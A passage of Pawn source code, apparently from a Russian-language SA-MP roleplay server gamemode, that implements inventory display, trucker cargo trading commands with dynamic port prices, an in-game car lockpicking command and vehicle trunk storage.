							PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[324][invObj]);
							PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[324][invRot][0], InvType[324][invRot][1], InvType[324][invRot][2], InvType[324][invRot][3]);
						}
					    case 2:
						{
					 		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[442][invObj]);
							PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[442][invRot][0], InvType[442][invRot][1], InvType[442][invRot][2], InvType[442][invRot][3]);
						}
					    case 3:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[443][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[443][invRot][0], InvType[443][invRot][1], InvType[443][invRot][2], InvType[443][invRot][3]);
						}
					    case 5:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[325][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[325][invRot][0], InvType[325][invRot][1], InvType[325][invRot][2], InvType[325][invRot][3]);
						}
					    case 17:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[328][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[328][invRot][0], InvType[328][invRot][1], InvType[328][invRot][2], InvType[328][invRot][3]);
						}
					    case 23:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[444][invObj]);
							 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[444][invRot][0], InvType[444][invRot][1], InvType[444][invRot][2], InvType[444][invRot][3]);
						}
					    case 24:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[329][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[329][invRot][0], InvType[329][invRot][1], InvType[329][invRot][2], InvType[329][invRot][3]);
						}
					    case 25:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[330][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[330][invRot][0], InvType[330][invRot][1], InvType[330][invRot][2], InvType[330][invRot][3]);
						}
					    case 28:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[336][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[336][invRot][0], InvType[336][invRot][1], InvType[336][invRot][2], InvType[336][invRot][3]);
						}
					    case 29:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[331][invObj]);
					    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[331][invRot][0], InvType[331][invRot][1], InvType[331][invRot][2], InvType[331][invRot][3]);
						}
					    case 30:
						{
							PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[332][invObj]);
							PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[332][invRot][0], InvType[332][invRot][1], InvType[332][invRot][2], InvType[332][invRot][3]);
						}
				     	case 31:
						{
							 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[333][invObj]);
				     		 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[333][invRot][0], InvType[333][invRot][1], InvType[333][invRot][2], InvType[333][invRot][3]);
						}
				     	case 33:
						{
					 		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[334][invObj]);
				     		PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[334][invRot][0], InvType[334][invRot][1], InvType[334][invRot][2], InvType[334][invRot][3]);
						}
				     	case 34:
						{
					 		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[335][invObj]);
				     		PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[335][invRot][0], InvType[335][invRot][1], InvType[335][invRot][2], InvType[335][invRot][3]);
						}

					}
					PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
		 			format(str,sizeof(str),"%d",ammo[i+1]);
					PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
		 	    }
		 	    else
		 	    {
					PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
		 	    }
		    }

		    if(i > 5 && i < 36)
		    {
		 	    if(InvInfo[playerid][iSlot][i-6])
		 	    {
		            PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invObj]);
		            PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invRot][0], InvType[InvInfo[playerid][iSlot][i-6]][invRot][1], InvType[InvInfo[playerid][iSlot][i-6]][invRot][2], InvType[InvInfo[playerid][iSlot][i-6]][invRot][3]);
		 	//		PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
		 			PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
		 			format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i-6]);
					PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
		 		}
		 		else
		 		{
		 		    PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
		 		}
			}
	 	    if(i >= 37 && i<= 42)
	 	    {
	 	    
				for(new x = 338; x < 434; x++)
				{
				    if(InvType[x][invObj] != PlayerInfo[playerid][pAcs][i-37]) continue;
				    PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[x][invObj]);
				    PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[x][invRot][0], InvType[x][invRot][1], InvType[x][invRot][2], InvType[x][invRot][3]);
				    break;
				}
				if(!PlayerInfo[playerid][pAcs][i-37])
				{
					PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
					PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
				}
	 	    }
		}
	 	PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
	 	  
	}
 	SelectTextDraw(playerid, 0xFFCC00FF);
 	SetPVarInt(playerid,"InvOpen",1);
	if(!PlayerInfo[playerid][pUl][2])
	{
	    TextDrawHideForPlayer(playerid,Inventory[5]);
	    TextDrawHideForPlayer(playerid,Inventory[6]);
	    TextDrawHideForPlayer(playerid,Inventory[7]);
	    TextDrawHideForPlayer(playerid,Inventory[8]);
	    TextDrawHideForPlayer(playerid,Inventory[9]);
	    TextDrawHideForPlayer(playerid,Inventory[10]);
		TextDrawHideForPlayer(playerid,Inventory[13]);
		TextDrawHideForPlayer(playerid,Inventory[14]);
	}
	
 	return 1;
}
stock GiveGunObj(modelid)
{
    new objid = -1;
    switch(modelid)
	{
	 	case 324: objid = 1;
	    case 442: objid = 2;
	    case 443: objid = 3;
	    case 325: objid = 5;
	    case 328: objid = 17;
	    case 444: objid = 23;
	    case 329: objid = 24;
	    case 330: objid = 25;
	    case 336: objid = 28;
	    case 331: objid = 29;
	    case 332: objid = 30;
	    case 333: objid = 31;
	    case 334: objid = 33;
	    case 335: objid = 34;
	}
    return objid;
}
stock GiveID(modelid)
{
	new objid = -1;
	if(modelid >= 1 && modelid <= 34)
	{
		switch(modelid)
		{
		 	case 1: modelid = 331;
		    case 2: modelid = 333;
		    case 3: modelid = 334;
		    case 5: modelid = 336;
		    case 17: modelid = 343;
		    case 23: modelid = 347;
		    case 24: modelid = 348;
	        case 25: modelid = 349;
	        case 28: modelid = 352;
	        case 29: modelid = 353;
	        case 30: modelid = 355;
	        case 31: modelid = 356;
	        case 33: modelid = 357;
	        case 34: modelid = 358;
		}
	}
	for(new i = 0; i < sizeof(InvType); i++)
	{
		if(InvType[i][invObj] != modelid) continue;
		objid = i;
		break;
	}
	return objid;
}
CMD:givephone(playerid)
{
    GiveInv(playerid,317,1);
    GiveInv(playerid,441,1);
    return 1;
}

stock UpdatePort()
{
	new str[145];
	format(str,sizeof(str),"[Порт Los Santos]{ffffff}\nРуда: {f7ae11}%d${ffffff}\nНефть: {f7ae11}%d${ffffff}\nДерево: {f7ae11}%d${ffffff}\nИспользуйте: {f7ae11}/tsell",PriceLS[P_SHAHTA],PriceLS[P_OIL],PriceLS[P_DEREVO]);
	UpdateDynamic3DTextLabelText(portlstext,CREWARD,str);
	format(str,sizeof(str),"[Порт Las Venturas]{ffffff}\nРуда: {f7ae11}%d${ffffff}\nНефть: {f7ae11}%d${ffffff}\nДерево: {f7ae11}%d${ffffff}\nИспользуйте: {f7ae11}/tsell",PriceLV[P_SHAHTA],PriceLV[P_OIL],PriceLV[P_DEREVO]);
	UpdateDynamic3DTextLabelText(portlvtext,CREWARD,str);
}
CMD:tmonitoring(playerid,params[])
{
    static const fmt_string[] = "{ffffff}Покупка:\n\n\tРуда: {f7ae11}50${ffffff}\n\tНефть: {f7ae11}50${ffffff}\n\tДерево: {f7ae11}50${ffffff}\n\nПродажа:\n\nПорт Los Santos:\n\tРуда: {f7ae11}%d${ffffff}\n\tНефть: {f7ae11}%d${ffffff}\n\tДерево: {f7ae11}%d${ffffff}\n\nПорт Las Venturas:\n\tРуда: {f7ae11}%d${ffffff}\n\tНефть: {f7ae11}%d${ffffff}\n\tДерево: {f7ae11}%d${ffffff}\n\n{F85A5A} - Цена указана за тонну!";
	new str[sizeof(fmt_string)+6];
	format(str, sizeof(str), fmt_string,PriceLS[P_SHAHTA],PriceLS[P_OIL],PriceLS[P_DEREVO]
	,PriceLV[P_SHAHTA],PriceLV[P_OIL],PriceLV[P_DEREVO]);
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Цены",str,"Далее","");
	return 1;
}

CMD:tsell(playerid,params[])
{
    new veh = GetPlayerVehicleID(playerid);
	if((GetVehicleModel(veh) != 514 && GetVehicleModel(veh) != 403 && GetVehicleModel(veh) != 515) || GetPVarInt(playerid,"Mar") != 36) return SendClientMessage(playerid,CGREY,"Вы не в транспорте дальнобойщика!");
    if(GetVehicleTrailer(veh) != Trailer[playerid]) return SendClientMessage(playerid, CGREY, "У Вас нет груза!");
    new minprice = 1000,minp = -1,type;
    switch(GetVehicleModel(GetVehicleTrailer(veh)))
    {
        case 450: type = P_SHAHTA;
        case 584: type = P_OIL;
        case 591: type = P_DEREVO;
    }
	static const fmt_string[] = "Груз доставлен! Вы получили: %d$";
	new str[sizeof(fmt_string)+5];
	new nap;
    switch(GetVehicleModel(veh))
    {
        case 514: nap = 5;
        case 403: nap = 10;
        case 515: nap = 15;
    }
	if(IsPlayerInDynamicArea(playerid,portls))
	{
	    GiveMoney(playerid,PriceLS[type]*TrailerKol[playerid]);
	    format(str, sizeof(str), fmt_string,PriceLS[type]*TrailerKol[playerid]);
	    SendClientMessage(playerid,CGREEN,str);
        if(PriceLS[type] > 300) PriceLS[type] -= 100;
		for(new i = 0; i < 3; i++)
		{
			if(i == type) continue;
			if(minprice > PriceLS[i])
			{
			    minprice = PriceLS[i];
			    minp = i;
			}
			PriceLS[i] += 100;
		}
        PriceLS[minp] += 100;
        DestroyVehicle(Trailer[playerid]);
		Trailer[playerid] = -1;
		TrailerKol[playerid] = 0;
		UpdatePort();
		new str1[40];
		format(str1,sizeof(str1),"Загруженно: {f7ae11}0/%d т.",nap);
		UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str1);
		if(!PlayerInfo[playerid][pQuestS][4])
		{
			PlayerQuest[playerid][4][5]++;
			CheckQuest(playerid,4);
		}
	}
	else if(IsPlayerInDynamicArea(playerid,portlv))
	{
        GiveMoney(playerid,PriceLV[type]*TrailerKol[playerid]);
        format(str, sizeof(str), fmt_string,PriceLV[type]*TrailerKol[playerid]);
        SendClientMessage(playerid,CGREEN,str);
        if(PriceLV[type] > 300) PriceLV[type] -= 100;
		for(new i = 0; i < 3; i++)
		{
			if(i == type) continue;
			if(minprice > PriceLV[i])
			{
			    minprice = PriceLV[i];
			    minp = i;
			}
			PriceLV[i] += 100;
		}
        PriceLV[minp] += 100;
        DestroyVehicle(Trailer[playerid]);
		Trailer[playerid] = -1;
		TrailerKol[playerid] = 0;
		UpdatePort();
		new str1[40];
		format(str,sizeof(str),"Загруженно: {f7ae11}0/%d т.",nap);
		UpdateDynamic3DTextLabelText(CarLable[GetPlayerVehicleID(playerid)],-1,str1);
		if(!PlayerInfo[playerid][pQuestS][4])
		{
			PlayerQuest[playerid][4][5]++;
			CheckQuest(playerid,4);
		}
	}
	
	return 1;
}

CMD:tbuy(playerid,params[])
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
	new veh = GetPlayerVehicleID(playerid);
	if((GetVehicleModel(veh) != 514 && GetVehicleModel(veh) != 403 && GetVehicleModel(veh) != 515) || GetPVarInt(playerid,"Mar") != 36) return SendClientMessage(playerid,CGREY,"Вы не в транспорте дальнобойщика!");
	if(TrailerKol[playerid]) return SendClientMessage(playerid, CGREY, "У Вас уже есть купленный груз!");
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /tbuy [кол-во]");
	if(PlayerInfo[playerid][pCash] < params[0]*50) return SendClientMessage(playerid, CGREY, "Недостаточно средств");
	if(params[0] < 1) return SendClientMessage(playerid, CGREY, "Минимальный вес загрузки 1 тонна!");
	new nap;
    switch(GetVehicleModel(veh))
    {
        case 514: nap = 5;
        case 403: nap = 10;
        case 515: nap = 15;
    }
    if(params[0] > nap) return SendClientMessage(playerid, CGREY, "Недостаточно места!");
    new tr;
	if(IsPlayerInDynamicArea(playerid,shahtapic))
	{
	    SetPlayerRaceCheckpoint(playerid,2,835.4733,874.1348,13.8671,0,0,0,5);
		tr = CreateVehicle(450,835.4733,874.1348,13.8671,197.8366,1,1,-1); // shahta op
	}
	else if(IsPlayerInDynamicArea(playerid,oilpic))
	{
	    SetPlayerRaceCheckpoint(playerid,2,667.2112,1258.7114,12.5977,0,0,0,5);
		tr = CreateVehicle(584,667.2112,1258.7114,12.5977,200.6139,1,1,-1); // oil op
	}
	else if(IsPlayerInDynamicArea(playerid,derevopic))
	{
	    SetPlayerRaceCheckpoint(playerid,2,-503.1817,-206.0636,79.0086,0,0,0,5);
		tr = CreateVehicle(591,-503.1817,-206.0636,79.0086,353.5783,1,1,-1); // derevo op
	}
	TrailerKol[playerid] = params[0];
    SetPVarInt(playerid,"GPS",1);
    SendClientMessage(playerid,CREWARD,"У Вас есть 30 секунд, чтобы забрать прицеп!");
    Trailer[playerid] = tr;
    SetPVarInt(playerid,"TimerDal",30);
	return 1;
}



/*CMD:torg(playerid)
{
	ShowPlayerDialog(playerid,443,DIALOG_STYLE_LIST,"Торговая площадка","1 | Каталог товаров\n{20BA09}2 | Добавить свой товар","Далее","Отмена");
	return 1;
}
CMD:starthack(playerid)
{
    StartHack(playerid);
	return 1;
}*/
CMD:hack(playerid)
{
	if(!PlayerInfo[playerid][pOtm]) return SendClientMessage(playerid,CGREY,"У Вас нет отмычки!");
	PlayerInfo[playerid][pOtm]--;
	InvMinus(playerid,458,1);
	if(!random(2)) return SendClientMessage(playerid,CREWARD,"Отмычка сломалась");
    new Float:CarPos[3];
    new full = 0;
    for(new c=0; c<MAX_VEHICLES; c++)
    {
        GetVehiclePos(c,CarPos[0],CarPos[1],CarPos[2]);
        if(!IsPlayerInRangeOfPoint(playerid,3.0,CarPos[0],CarPos[1],CarPos[2])) continue;
        StartHack(playerid);
        SetPVarInt(playerid,"HackCarID",c);
        full++;
        break;
	}
	if(full == 0) return SendClientMessage(playerid,CGREY,"Вы не у около транспорта");
	return 1;
}
CMD:put(playerid)
{
    new Float:CarPos[3];
    new full = 0;
    for(new c=0; c<MAX_VEHICLES; c++)
    {
    	GetCoordBootVehicle(c,CarPos[0],CarPos[1],CarPos[2]);
     	if(IsPlayerInRangeOfPoint(playerid,3.0,CarPos[0],CarPos[1],CarPos[2]))
     	{
     	    if(GetPVarInt(playerid,"HealP"))
     	    {
     	        if(BInfo[c][bHeal] >= 10) return SendClientMessage(playerid,CGREY,"Недостаточно места в багажнике");
                DeletePVar(playerid,"HealP");
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				BInfo[c][bHeal] += 1;

				GiveTrunkInv(c,456,1);
				SendClientMessage(playerid,CREWARD,"Вы пожили аптечку в багажник");
				static const fmt_string[] = "%s аптечку в багажник";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "положил аптечку в багажник", COLOR_PURPLE, 30.0, 7000);
     	    }
     	    else if(GetPVarInt(playerid,"DrugsVR"))
     	    {
     	        if(BInfo[c][bDrugs] >= 6) return SendClientMessage(playerid,CGREY,"Недостаточно места в багажнике");
                DeletePVar(playerid,"DrugsVR");
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				BInfo[c][bDrugs] += 1;
                SetPlayerSpecialAction(playerid,0);
				GiveTrunkInv(c,457,1);
				SendClientMessage(playerid,CREWARD,"Вы пожили наркотики в багажник");
				static const fmt_string[] = "%s наркотики в багажник";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "положил наркотики в багажник", COLOR_PURPLE, 30.0, 7000);
     	    }
		    else if(GetPVarInt(playerid,"AmmoVR"))
		    {
	     	    new kek;
				if(GetVehicleModel(c) == 482 || GetVehicleModel(c) == 433 || GetVehicleModel(c) == 573) kek = 10;
				else kek = 6;
				if(BInfo[c][bMats] >= kek) return SendClientMessage(playerid,CGREY,"Недостаточно места в багажнике");
				BInfo[c][bMats] += 1;
				GiveTrunkInv(c,455,1);
				DeletePVar(playerid,"AmmoVR");
				SetPlayerSpecialAction(playerid,0);
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
				SendClientMessage(playerid,CREWARD,"Вы пожили ящик с материалами в багажник");
				static const fmt_string[] = "%s положил ящик с материалами в багажник";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "положил ящик с материалами в багажник", COLOR_PURPLE, 30.0, 7000);
			}
			else if(GetPVarInt(playerid,"MoneyV"))
		    {
				if(BInfo[c][bMoney] >= 1000000) return SendClientMessage(playerid,CGREY,"Недостаточно места в багажнике");
				BInfo[c][bMoney] += GetPVarInt(playerid,"MoneyV");
				GiveTrunkInv(c,459,GetPVarInt(playerid,"MoneyV"));
				DeletePVar(playerid,"MoneyV");
				SetPlayerSpecialAction(playerid,0);
				if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
				ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
				SendClientMessage(playerid,CREWARD,"Вы пожили сумку с деньгами");
				static const fmt_string[] = "%s положил сумку с деньгами";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "положил сумку с деньгами", COLOR_PURPLE, 30.0, 7000);
			}
	     	full++;
	     	break;
     	}
    }
    if(full == 0) return SendClientMessage(playerid,CGREY,"Вы не у багажника");
    return 1;
}
CMD:trunk(playerid, params[])
{
    new Float:CarPos[3];
    new full = 0;
    for(new c=0; c<MAX_VEHICLES; c++)
    {
    	GetCoordBootVehicle(c,CarPos[0],CarPos[1],CarPos[2]);
     	if(IsPlayerInRangeOfPoint(playerid,3.0,CarPos[0],CarPos[1],CarPos[2]))
     	{
      		if(sscanf(params, "s[20]", params))
      		{
      		    if(BInfo[c][bLock] == 1) return SendClientMessage(playerid,CGREY,"Багажник закрыт. Используйте: /trunk lock");
      		    SetPVarInt(playerid,"Car",c);
      		  //  return ShowPlayerDialog(playerid,291,DIALOG_STYLE_LIST,"Багажник","1 |  Взять\n2 | Положить\n3 | Информация","Далее","Отмена");
				GetPlayerHouse(playerid);
				CreateInv(playerid);
				CreateTrunk(playerid);
				TextDrawSetString(Inventory1[4],"TRUNK");

				for(new i = 0; i < 16; i++)
				{
					if(i < 15) TextDrawShowForPlayer(playerid,Inventory[i]);
					TextDrawShowForPlayer(playerid,Inventory1[i]);
				}
				TextDrawShowForPlayer(playerid,Inventory[22]);
				new weapons[7],ammo[7];
				new str[5];
				for (new i = 0; i < 7; i++) GetPlayerWeaponData(playerid, i, weapons[i], ammo[i]);
				for(new i = 0; i < 36; i++)
				{
				    if(BInfo[c][bInvSlot][i])
					{
						PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[BInfo[c][bInvSlot][i]][invObj]);
				        PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[BInfo[c][bInvSlot][i]][invRot][0], InvType[BInfo[c][bInvSlot][i]][invRot][1], InvType[BInfo[c][bInvSlot][i]][invRot][2], InvType[BInfo[c][bInvSlot][i]][invRot][3]);
				//		PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
						PlayerTextDrawShow(playerid,InvAmm1[playerid][i]);
						format(str,sizeof(str),"%d",BInfo[c][bInvKol][i]);
						PlayerTextDrawSetString(playerid,InvAmm1[playerid][i],str);
					}
					else
					{
					    PlayerTextDrawSetPreviewModel(playerid, InventoryP1[i][playerid], InvType[0][invObj]);
						PlayerTextDrawSetPreviewRot(playerid, InventoryP1[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
					}
				    if(i >= 0 && i<= 5)
				    {
				 	    if(ammo[i+1])
						{
							switch(weapons[i+1])
							{
							    case 1:
								{
									PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[324][invObj]);
									PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[324][invRot][0], InvType[324][invRot][1], InvType[324][invRot][2], InvType[324][invRot][3]);
								}
							    case 2:
								{
							 		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[442][invObj]);
									PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[442][invRot][0], InvType[442][invRot][1], InvType[442][invRot][2], InvType[442][invRot][3]);
								}
							    case 3:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[443][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[443][invRot][0], InvType[443][invRot][1], InvType[443][invRot][2], InvType[443][invRot][3]);
								}
							    case 5:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[325][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[325][invRot][0], InvType[325][invRot][1], InvType[325][invRot][2], InvType[325][invRot][3]);
								}
							    case 17:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[328][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[328][invRot][0], InvType[328][invRot][1], InvType[328][invRot][2], InvType[328][invRot][3]);
								}
							    case 23:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[444][invObj]);
									 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[444][invRot][0], InvType[444][invRot][1], InvType[444][invRot][2], InvType[444][invRot][3]);
								}
							    case 24:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[329][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[329][invRot][0], InvType[329][invRot][1], InvType[329][invRot][2], InvType[329][invRot][3]);
								}
							    case 25:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[330][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[330][invRot][0], InvType[330][invRot][1], InvType[330][invRot][2], InvType[330][invRot][3]);
								}
							    case 28:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[336][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[336][invRot][0], InvType[336][invRot][1], InvType[336][invRot][2], InvType[336][invRot][3]);
								}
							    case 29:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[331][invObj]);
							    	 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[331][invRot][0], InvType[331][invRot][1], InvType[331][invRot][2], InvType[331][invRot][3]);
								}
							    case 30:
								{
									PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[332][invObj]);
									PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[332][invRot][0], InvType[332][invRot][1], InvType[332][invRot][2], InvType[332][invRot][3]);
								}
						     	case 31:
								{
									 PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[333][invObj]);
						     		 PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[333][invRot][0], InvType[333][invRot][1], InvType[333][invRot][2], InvType[333][invRot][3]);
								}
						     	case 33:
								{
							 		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[334][invObj]);
						     		PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[334][invRot][0], InvType[334][invRot][1], InvType[334][invRot][2], InvType[334][invRot][3]);
								}
						     	case 34:
								{
							 		PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[335][invObj]);
						     		PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[335][invRot][0], InvType[335][invRot][1], InvType[335][invRot][2], InvType[335][invRot][3]);
								}

							}
							PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
				 			format(str,sizeof(str),"%d",ammo[i+1]);
							PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
				 	    }
				 	    else
				 	    {
							PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
							PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
				 	    }
				    }

				    if(i > 5 && i < 36)
				    {

				 	    if(InvInfo[playerid][iSlot][i-6])
				 	    {
				            PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invObj]);
				            PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[InvInfo[playerid][iSlot][i-6]][invRot][0], InvType[InvInfo[playerid][iSlot][i-6]][invRot][1], InvType[InvInfo[playerid][iSlot][i-6]][invRot][2], InvType[InvInfo[playerid][iSlot][i-6]][invRot][3]);
				 	//		PlayerTextDrawBackgroundColor(playerid, InventoryP[i][playerid], 0x8C8C8C00);
				 			PlayerTextDrawShow(playerid,InvAmm[playerid][i]);
				 			format(str,sizeof(str),"%d",InvInfo[playerid][iKol][i-6]);
							PlayerTextDrawSetString(playerid,InvAmm[playerid][i],str);
				 		}
				 		else
				 		{
				 		    PlayerTextDrawSetPreviewModel(playerid, InventoryP[i][playerid], InvType[0][invObj]);
							PlayerTextDrawSetPreviewRot(playerid, InventoryP[i][playerid], InvType[0][invRot][0], InvType[0][invRot][1], InvType[0][invRot][2], InvType[0][invRot][3]);
				 		}
					}
					PlayerTextDrawShow(playerid,InventoryP[i][playerid]);
					PlayerTextDrawShow(playerid,InventoryP1[i][playerid]);
				}
				SetPVarInt(playerid,"OpenTrunk",1);
                TextDrawHideForPlayer(playerid,Inventory1[5]);
			    TextDrawHideForPlayer(playerid,Inventory1[6]);
			    TextDrawHideForPlayer(playerid,Inventory1[7]);
			    TextDrawHideForPlayer(playerid,Inventory1[8]);
			    TextDrawHideForPlayer(playerid,Inventory1[9]);
			    TextDrawHideForPlayer(playerid,Inventory1[10]);
				TextDrawHideForPlayer(playerid,Inventory1[13]);
				TextDrawHideForPlayer(playerid,Inventory1[14]);
				SelectTextDraw(playerid, 0xFFCC00FF);
				SendClientMessage(playerid,CGREY,"Для закрытия багажника используйте кнопку 'ESC'");
      		  	return 1;
      		}
      		if(!strcmp(params, "lock", true))
      		{
 				new car = -1;
				for(new x = 1; x <= TOTALVEH;  x++)
				{
	   				if(c != VehInfo[x][vVehicle]) continue;
					car = x;
				}
				if(car != -1 && VehInfo[car][vFr] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Данный транспорт пренадлежит не Вашей организации");
